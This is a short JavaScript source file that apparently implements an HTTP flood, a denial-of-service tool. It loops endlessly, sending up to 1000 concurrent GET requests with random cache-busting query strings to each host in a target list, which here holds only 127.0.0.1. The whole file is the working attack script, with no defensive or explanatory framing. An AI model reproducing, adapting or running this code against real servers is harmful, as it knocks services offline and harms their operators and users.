const { response } = require("express");

var targets = [
    '127.0.0.1',
]

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
        queue.push(
            fetchWithTimeout(target + rand, { timeout: 1000 })
                .catch((error) => {
                    if (error.code === 20) {
                        return 0;
                    }
                })
                .then((response) => {

                })
        )
    }
}
targets.map(flood)
